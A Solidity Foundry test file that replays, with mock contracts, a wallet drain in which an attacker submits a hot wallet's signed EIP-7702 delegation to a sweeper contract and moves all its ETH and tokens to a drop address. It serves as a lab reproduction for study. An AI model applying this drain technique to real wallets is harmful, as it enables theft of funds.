// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test, Vm} from "forge-std/Test.sol";
import {Sweeper7702} from "../src/lab/Sweeper7702.sol";
import {MockUSDT} from "../src/lab/MockUSDT.sol";

/// @notice Replays the Binance 14 drain mechanism (2026-10-29) with EIP-7702 cheatcodes.
contract Sweeper7702Test is Test {
    uint256 constant HOT_KEY = 0xB14;
    address hot = vm.addr(HOT_KEY);
    address attacker = makeAddr("attacker");
    address payable drop = payable(makeAddr("drop"));
    Sweeper7702 x;
    MockUSDT usdt;

    function setUp() public {
        x = new Sweeper7702(attacker, drop);
        usdt = new MockUSDT();
        vm.deal(hot, 167_464 ether);
        usdt.mint(hot, 1_175_000_000e6);
    }

    /// @dev The attacker, not the hot wallet, submits the hot wallet's signed authorization.
    function _delegate() internal {
        Vm.SignedDelegation memory auth = vm.signDelegation(address(x), HOT_KEY);
        vm.prank(attacker);
        vm.attachDelegation(auth);
        (bool ok,) = attacker.call("");
        ok;
    }

    function test_delegationSetsDesignatorCode() public {
        assertEq(hot.code.length, 0);
        _delegate();
        assertEq(hot.code, abi.encodePacked(hex"ef0100", address(x)));
        assertEq(hot.balance, 167_464 ether, "delegating moves nothing");
    }

    function test_attackerSweepsThroughHotWalletAddress() public {
        _delegate();
        address[] memory tokens = new address[](1);
        tokens[0] = address(usdt);
        vm.prank(attacker);
        Sweeper7702(payable(hot)).sweep(tokens);
        // GAS_KEEP (0.01 ETH) is left behind on purpose; everything else is swept.
        assertEq(hot.balance, x.GAS_KEEP());
        assertEq(usdt.balanceOf(hot), 0);
        assertEq(drop.balance, 167_464 ether - x.GAS_KEEP());
        assertEq(usdt.balanceOf(drop), 1_175_000_000e6);
    }

    function test_strangerCannotSweep() public {
        _delegate();
        address[] memory tokens = new address[](0);
        vm.expectRevert("not operator");
        Sweeper7702(payable(hot)).sweep(tokens);
    }

    function test_hotWalletOwnTransfersStillWork() public {
        _delegate();
        vm.prank(hot);
        (bool ok,) = payable(address(0xBEEF)).call{value: 1 ether}("");
        assertTrue(ok);
        assertEq(address(0xBEEF).balance, 1 ether);
    }

    function test_revokeClearsCode() public {
        _delegate();
        Vm.SignedDelegation memory revoke = vm.signDelegation(address(0), HOT_KEY);
        vm.attachDelegation(revoke);
        (bool ok,) = attacker.call("");
        ok;
        assertEq(hot.code.length, 0);
    }
}
